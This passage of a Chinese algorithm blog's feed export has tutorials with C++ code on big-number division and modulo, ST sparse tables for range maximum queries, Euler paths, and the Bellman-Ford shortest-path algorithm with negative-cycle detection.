<h3 id="高精度对单精度"><a href="#高精度对单精度" class="headerlink" title="高精度对单精度"></a>高精度对单精度</h3><p>这个就简单多了，原理还是一样</p>
<p>关键代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">    nowNum = nowNum * <span class="number">10</span> + (<span class="keyword">long</span> <span class="keyword">long</span>)num[i];</span><br><span class="line">    <span class="keyword">if</span> (nowNum &gt;= divNum)&#123;</span><br><span class="line">        ans[i] = nowNum / divNum;</span><br><span class="line">        nowNum = nowNum % divNum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>练手题目：<a href="https://www.luogu.com.cn/problem/P1480" target="_blank" rel="noopener">洛谷1480</a></p>
<p><code>AC</code>代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> num[<span class="number">5005</span>], len, ans[<span class="number">5005</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">5005</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, buff);</span><br><span class="line">    len = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)num[i] = buff[len - i - <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> divNum;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%lld"</span>, &amp;divNum);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> nowNum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        nowNum = nowNum * <span class="number">10</span> + (<span class="keyword">long</span> <span class="keyword">long</span>)num[i];</span><br><span class="line">        <span class="keyword">if</span> (nowNum &gt;= divNum)&#123;</span><br><span class="line">            ans[i] = nowNum / divNum;</span><br><span class="line">            nowNum = nowNum % divNum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(len &gt;= <span class="number">1</span> &amp;&amp; ans[len - <span class="number">1</span>] == <span class="number">0</span>)len--;</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>)<span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"0"</span>), <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>, ans[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="求模"><a href="#求模" class="headerlink" title="求模"></a>求模</h2><h3 id="高精度对高精度-1"><a href="#高精度对高精度-1" class="headerlink" title="高精度对高精度"></a>高精度对高精度</h3><p>这个就没什么好讲的了，参考高精度对高精度除法即可</p>
<h3 id="高精度对单精度-1"><a href="#高精度对单精度-1" class="headerlink" title="高精度对单精度"></a>高精度对单精度</h3><p>算法的原理是根据</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">(a + b) % c == (a % c + b % c) % c</span><br></pre></td></tr></table></figure>

<p>因此高精度对单精度求模等价于从高位开始进行求模，然后将结果往低位传播即可</p>
<p>练手题目：<a href="http://poj.org/problem?id=2635" target="_blank" rel="noopener">poj2635</a></p>
<p><code>AC</code>代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_NUM = <span class="number">1e6</span>;</span><br><span class="line"><span class="keyword">bool</span> notDeleted[MAX_NUM];</span><br><span class="line"><span class="keyword">int</span> prime[<span class="number">80000</span>], total;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getPrime</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; MAX_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!notDeleted[i])&#123;</span><br><span class="line">            prime[total++] = i;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i * i; j &gt; <span class="number">0</span> &amp;&amp; j &lt; MAX_NUM; j += i)notDeleted[j] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">checkModZero</span><span class="params">(<span class="keyword">int</span> num[], <span class="keyword">int</span> len, <span class="keyword">int</span> checkPrime)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mod = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        <span class="comment">// 从高位求模，往后传播</span></span><br><span class="line">        mod = (mod * <span class="number">1000</span> + num[i]) % checkPrime;</span><br><span class="line">    <span class="keyword">return</span> mod == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handle</span><span class="params">(<span class="keyword">int</span> num[], <span class="keyword">int</span> &amp;len, <span class="keyword">char</span> buff[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span> = <span class="built_in">strlen</span>(buff), hand, ten, one;</span><br><span class="line">    <span class="keyword">char</span> tem;</span><br><span class="line">    buff[<span class="built_in">size</span>] = <span class="string">'\0'</span>, buff[<span class="built_in">size</span> + <span class="number">1</span>] = <span class="string">'\0'</span>, buff[<span class="built_in">size</span> + <span class="number">2</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (<span class="built_in">size</span> &gt;&gt; <span class="number">1</span>); i++)&#123;</span><br><span class="line">        tem = buff[i];</span><br><span class="line">        buff[i] = buff[<span class="built_in">size</span> - i - <span class="number">1</span>];</span><br><span class="line">        buff[<span class="built_in">size</span> - i - <span class="number">1</span>] = tem;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(len = <span class="number">0</span>; buff[len * <span class="number">3</span>] != <span class="string">'\0'</span>;len++)&#123;</span><br><span class="line">        <span class="comment">// 这里需要压位，否则会超时</span></span><br><span class="line">        num[len] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (buff[len * <span class="number">3</span> + <span class="number">2</span>] != <span class="string">'\0'</span>)num[len] = num[len] * <span class="number">10</span> + buff[len * <span class="number">3</span> + <span class="number">2</span>] - <span class="string">'0'</span>;</span><br><span class="line">        <span class="keyword">if</span> (buff[len * <span class="number">3</span> + <span class="number">1</span>] != <span class="string">'\0'</span>)num[len] = num[len] * <span class="number">10</span> + buff[len * <span class="number">3</span> + <span class="number">1</span>] - <span class="string">'0'</span>;</span><br><span class="line">        num[len] = num[len] * <span class="number">10</span> + buff[len * <span class="number">3</span>] - <span class="string">'0'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    getPrime();</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">105</span>];</span><br><span class="line">    <span class="keyword">int</span> l, len, num[<span class="number">105</span>];</span><br><span class="line">    <span class="keyword">bool</span> flag;</span><br><span class="line">    <span class="keyword">while</span> (~<span class="built_in">scanf</span>(<span class="string">"%s%d"</span>, buff, &amp;l))&#123;</span><br><span class="line">        <span class="keyword">if</span> (l == <span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">        flag = <span class="literal">false</span>;</span><br><span class="line">        handle(num, len, buff);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; total &amp;&amp; prime[i] &lt; l; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (checkModZero(num, len, prime[i]))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"BAD %d\n"</span>, prime[i]);</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!flag)<span class="built_in">printf</span>(<span class="string">"GOOD\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>高精度</tag>
        <tag>模拟</tag>
      </tags>
  </entry>
  <entry>
    <title>RMQ问题之ST表</title>
    <url>/2021/04/28/RMQ%E9%97%AE%E9%A2%98%E4%B9%8BST%E8%A1%A8/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>ST</code>表和线段树类似，用于快速求解区间问题，二者的建立时间都是<code>O(nlogn)</code>，但是<code>ST</code>表查询的时间达到了<code>O(1)</code>，虽然说不支持区间更新，线段树支持更新，更新花费时间<code>O(logn)</code>，查询花费<code>O(logn)</code><a id="more"></a></p>
<h2 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h2><ul>
<li><code>RMQ</code>:<code>Range Minimum/Maximum Query</code>， 中文为区间最值查询 。</li>
<li>可重复贡献问题：官方术语解释起来不好解释，举个例子：假如我需要求前面<code>8</code>个数字的最值，我可以先求这<code>8</code>个数字中偏前面的<code>6</code>个中的最值<code>number1</code>，然后再求这<code>8</code>个数字中偏后面的最值<code>number2</code>，然后求<code>number1</code>和<code>number2</code>中二者最优者即可，这个过程你会发现中间的几个数字被重复计算了。</li>
<li><code>ST</code>表：一种数据结构，英文名为<code>Sparse Table</code>，即稀疏表。</li>
</ul>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h3><p><code>ST</code>表应用了倍增以及动态规划的思想。</p>
<p>以求给定序列<code>number[]</code>的最大值为例：</p>
<p>定义<code>f[i][j]</code>为区间<code>[i, 2^j - 1]</code>内的最大值（即包括<code>number[i]</code>），特别的，<code>f[i][0]=number[i]</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">i					   							i + 2 ^ j - 1</span><br><span class="line">|------------------------------------------------|</span><br></pre></td></tr></table></figure>

<p>对于上述区间，长度为<code>2^(j)</code>，为了求<code>f[i][j]</code>，我们可以先求前半段的最大值，再求后半段的最大值，然后取二者中较大者。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">i					   							i + 2 ^ j - 1</span><br><span class="line">|------------------------------------------------|</span><br><span class="line">i          		i+2^(j-1)-1    i+2^(j-1) 			i + 2 ^ j - 1</span><br><span class="line">|--------------------------|   |----------------------|</span><br></pre></td></tr></table></figure>

<p>即状态转移方程为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f[i][j] &#x3D; max(f[i][j - 1], f[i + (1 &lt;&lt; (j - 1))][j - 1])</span><br></pre></td></tr></table></figure>

<h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><p><code>ST</code>表构建后之后，我们还不能直接拿过来简单使用，因为根据<code>ST</code>表的定义我们可以知道，当需要求的区间长度是<code>2</code>的整数幂的时候，<code>f[][]</code>才为所需要的答案。例如我要求的是<code>left=3,right=8</code>的区间中的最大值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3        6</span><br><span class="line">|--------|</span><br><span class="line">3            8</span><br><span class="line">|------------|</span><br><span class="line">3                 10</span><br><span class="line">|-----------------|</span><br></pre></td></tr></table></figure>

<p>此时<code>f[3][2]</code>代表上面的区间，<code>f[3][3]</code>代表下面的区间，而我们要求的是中间的区间。</p>
<p>此时可重复贡献问题的优势就体现出来了。</p>
<p>我们可以把问题一般化，假设要求的是<code>[left,right]</code>的最大值，此时<code>log2(right - left)</code>不是整数，此时我们可以把所求的区间分为两个子区间（当然，这两个区间之间是有重叠的），如下图所示：</p>
<p><img src="https://qiniu.yalexin.top/ST%E8%A1%A8.png" alt></p>
<p><code>log2(len)</code>是对<code>len</code>取<code>2</code>对数并下取整，最上面的区间和最小面的区间长度都是<code>2</code>的次幂，可以很方便地分别使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f[left][x]</span><br><span class="line">f[right - 2^x + 1][x]</span><br></pre></td></tr></table></figure>

<p>来表示，其中<code>x=log2(right - left + 1)</code>并向下取整（加<code>1</code>应该很好理解）,此时中间所要求的区间即：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f[left][right] &#x3D; max(f[left][x], f[right - 2^x + 1][x])</span><br></pre></td></tr></table></figure>

<h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><blockquote>
<p>题目来源：洛谷<a href="https://www.luogu.com.cn/problem/P3865" target="_blank" rel="noopener">【模板】ST表</a></p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_N = <span class="number">1e5</span> + <span class="number">20</span>;</span><br><span class="line"><span class="keyword">int</span> f[MAX_N][<span class="number">25</span>], n, m;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>, flag = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> ch = getchar();</span><br><span class="line">	<span class="keyword">while</span> (!<span class="built_in">isdigit</span>(ch))&#123;<span class="keyword">if</span> (ch==<span class="string">'-'</span>) flag = <span class="number">1</span>; ch = getchar();&#125;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch))&#123;sum = (sum &lt;&lt; <span class="number">1</span>) + (sum &lt;&lt; <span class="number">3</span>) + ch<span class="number">-48</span>;ch = getchar();&#125;</span><br><span class="line">	<span class="keyword">return</span> flag ? -sum : sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pre</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)f[i][<span class="number">0</span>] = <span class="built_in">read</span>();</span><br><span class="line">    <span class="comment">// 2^17 &gt; 1e5</span></span><br><span class="line">    <span class="comment">// 为什么以 j 开始进行枚举 i？</span></span><br><span class="line">    <span class="comment">// 因为 j 是控制区间长度的，保证 2^j 的区间是之前就已经求好的</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= <span class="number">17</span>; j++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i + (<span class="number">1</span> &lt;&lt; j) - <span class="number">1</span> &lt;= n; i++)&#123;</span><br><span class="line">            f[i][j] = <span class="built_in">max</span>(f[i][j - <span class="number">1</span>], f[i + (<span class="number">1</span> &lt;&lt; (j - <span class="number">1</span>))][j - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    n = <span class="built_in">read</span>(), m = <span class="built_in">read</span>();</span><br><span class="line">    pre();</span><br><span class="line">    <span class="keyword">int</span> l, r, xlog2, ans;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)&#123;</span><br><span class="line">        l = <span class="built_in">read</span>(), r = <span class="built_in">read</span>();</span><br><span class="line">        xlog2 = log2(r - l + <span class="number">1</span>);</span><br><span class="line">        ans = <span class="built_in">max</span>(f[l][xlog2], f[r - (<span class="number">1</span> &lt;&lt; xlog2) + <span class="number">1</span>][xlog2]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, ans);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>ST表</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title>图论之欧拉路</title>
    <url>/2021/04/25/%E5%9B%BE%E8%AE%BA%E4%B9%8B%E6%AC%A7%E6%8B%89%E8%B7%AF/</url>
    <content><![CDATA[<h2 id="欧拉路"><a href="#欧拉路" class="headerlink" title="欧拉路"></a>欧拉路</h2><blockquote>
<p>给定无孤立节点图<code>G</code>，若存在一条路，经过图中的每一条边一次且仅一次，那么该条路称为欧拉路，如果这条路的起点和终点相同，则该路称为欧拉回路，否则称为欧拉通路。</p>
</blockquote>
<a id="more"></a>

<h3 id="无向图"><a href="#无向图" class="headerlink" title="无向图"></a>无向图</h3><p>无向图中具有一条欧拉图，当且仅当该图是连通图且有零个或者两个奇数度的节点，所有点的度都是偶数的时候，该图有欧拉回路，有两个奇数度的节点时，有欧拉通路。</p>
<h3 id="有向图"><a href="#有向图" class="headerlink" title="有向图"></a>有向图</h3><p>有向图具有欧拉路当且仅当该图是连通的，若每个节点的入度等于出度，则存在欧拉回路，若图中除了两个节点之外，每个点的入度等于出度，而这两个点中一个点的入度比出度大<code>1</code>，另外一个点的出度比入读大<code>1</code>，则存在欧拉通路。</p>
<h2 id="求解欧拉路"><a href="#求解欧拉路" class="headerlink" title="求解欧拉路"></a>求解欧拉路</h2><p>当判断图中具有欧拉路后，可以根据深度优先搜索，对每一条边设置访问标记，当找到一条欧拉路后直接结束搜索，否则根据回溯思想不断进行搜索。</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>图论</tag>
      </tags>
  </entry>
  <entry>
    <title>Bellman-Ford算法模板</title>
    <url>/2021/04/24/Bellman-Ford%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<p><code>Bellman-Ford</code>与 <code>Dijkstra</code>算法一样，也是用于求带权图的最短路，不过与后者相比，前者可以解决边权为负数的情况，适应性较强；</p>
<p>算法主要的流程是对每一个点根据边进行松弛操作，最终求得最优解的过程。</p>
<p>算法的时间复杂度是<code>O（V*E）</code><a id="more"></a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_N = <span class="number">1501</span>, MAX_M = <span class="number">5e4</span> + <span class="number">1</span>, INF = <span class="number">0x7f7f7f7f</span>, START = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> n, m, minD[MAX_N], pre[MAX_N];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> u, v, w;</span><br><span class="line">&#125;edges[MAX_M];</span><br><span class="line"><span class="comment">// 快读</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> ok = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">char</span> ch = getchar();</span><br><span class="line">    <span class="keyword">while</span>(ch &lt; <span class="string">'0'</span> || ch &gt; <span class="string">'9'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (ch == <span class="string">'-'</span>)ok = <span class="literal">true</span>;</span><br><span class="line">        ch = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(ch &gt;= <span class="string">'0'</span> &amp;&amp; ch &lt;= <span class="string">'9'</span>)&#123;</span><br><span class="line">        sum = (sum &lt;&lt; <span class="number">1</span>) + (sum &lt;&lt; <span class="number">3</span>) + ch - <span class="string">'0'</span>;</span><br><span class="line">        ch = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ok ? -sum : sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> son)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (son != pre[son])&#123;</span><br><span class="line">        dfs(pre[son]);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"-&gt;"</span> &lt;&lt; <span class="built_in">flush</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; son &lt;&lt; <span class="built_in">flush</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; son &lt;&lt; <span class="built_in">flush</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_path</span><span class="params">(<span class="keyword">int</span> root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (root != pre[root]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d--&gt;"</span>, root);</span><br><span class="line">        root = pre[root];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (root == pre[root]) <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, root);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"nodeId: "</span> &lt;&lt; i &lt;&lt; <span class="string">", minLen : "</span> &lt;&lt; minD[i] &lt;&lt; <span class="string">", path : "</span> &lt;&lt; ends;</span><br><span class="line">        dfs(i);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 不存在负环的时候，minD中保存的就是从起始点到各个点的最短路权值</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Bellman_Ford</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(minD, <span class="number">0x7f</span>, <span class="keyword">sizeof</span> minD);</span><br><span class="line">    minD[START] = <span class="number">0</span>, pre[START] = START;</span><br><span class="line">    <span class="keyword">int</span> u, v, w;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= m; j++)&#123;</span><br><span class="line">            u = edges[j].u, v = edges[j].v, w = edges[j].w;</span><br><span class="line">            <span class="keyword">if</span> (minD[u] + w &lt; minD[v])&#123;</span><br><span class="line">                minD[v] = minD[u] + w;</span><br><span class="line">                pre[v] = u;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">bool</span> ok = <span class="literal">true</span>;  <span class="comment">//判断是否含有负权回路</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; ++i)</span><br><span class="line">        <span class="keyword">if</span> (minD[edges[i].v] &gt; minD[edges[i].u] + edges[i].w) &#123;</span><br><span class="line">            ok = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> ok;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    n = <span class="built_in">read</span>(), m = <span class="built_in">read</span>();</span><br><span class="line">    <span class="keyword">int</span> u, v, w;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)&#123;</span><br><span class="line">        <span class="comment">// 有向图</span></span><br><span class="line">        u = <span class="built_in">read</span>(), v = <span class="built_in">read</span>(), w = <span class="built_in">read</span>();</span><br><span class="line">        edges[i].u = u, edges[i].v = v, edges[i].w = w;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (Bellman_Ford())&#123;</span><br><span class="line">        <span class="built_in">print</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"not exit!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">5 7</span></span><br><span class="line"><span class="comment">1 2 5</span></span><br><span class="line"><span class="comment">1 3 5</span></span><br><span class="line"><span class="comment">2 5 -1</span></span><br><span class="line"><span class="comment">2 3 -2</span></span><br><span class="line"><span class="comment">3 4 3</span></span><br><span class="line"><span class="comment">3 5 -2</span></span><br><span class="line"><span class="comment">4 5 2</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">5 7</span></span><br><span class="line"><span class="comment">1 2 1</span></span><br><span class="line"><span class="comment">2 4 2</span></span><br><span class="line"><span class="comment">5 4 3</span></span><br><span class="line"><span class="comment">3 4 4</span></span><br><span class="line"><span class="comment">1 3 5</span></span><br><span class="line"><span class="comment">1 5 6</span></span><br><span class="line"><span class="comment">2 5 7</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>这部分的代码尤为重要：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> ok = <span class="literal">true</span>;  <span class="comment">//判断是否含有负权回路</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; ++i)</span><br><span class="line">    <span class="keyword">if</span> (minD[edges[i].v] &gt; minD[edges[i].u] + edges[i].w) &#123;</span><br><span class="line">        ok = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果存在从源点可达的权为负的回路，那么我就可以不断地通过使用这一条回路将路径长度缩小，即最小路径和不收敛，哪来的最短路？</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>最短路</tag>
      </tags>
  </entry>
  <entry>
    <title>树的重心</title>
